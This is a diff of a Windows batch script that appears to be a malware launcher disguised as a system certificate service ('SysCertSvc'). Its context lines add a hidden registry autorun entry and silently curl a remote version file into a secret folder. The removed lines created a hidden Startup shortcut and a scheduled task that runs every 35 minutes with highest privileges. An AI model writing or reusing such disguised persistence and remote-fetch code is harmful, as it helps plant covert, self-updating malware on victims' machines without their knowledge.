@@ -26,19 +26,6 @@ if %errorlevel% neq 0 (
     reg add "%regKey%" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /f >nul
 )
 
-set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
-if not exist "%shortcutPath%" (
-    powershell -Command ^
-        "$ws = New-Object -ComObject WScript.Shell; ^
-         $s = $ws.CreateShortcut('%shortcutPath%'); ^
-         $s.TargetPath = 'wscript.exe'; ^
-         $s.Arguments = '\"%vbsLauncherPath%\" \"%launcherScriptPath%\"'; ^
-         $s.WindowStyle = 7; ^
-         $s.Save()" >nul 2>&1
-)
-
-schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 35 /rl HIGHEST /f >nul
-
 curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 300 2>nul
 if exist "%secretPath%\lv.tmp" (
     set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
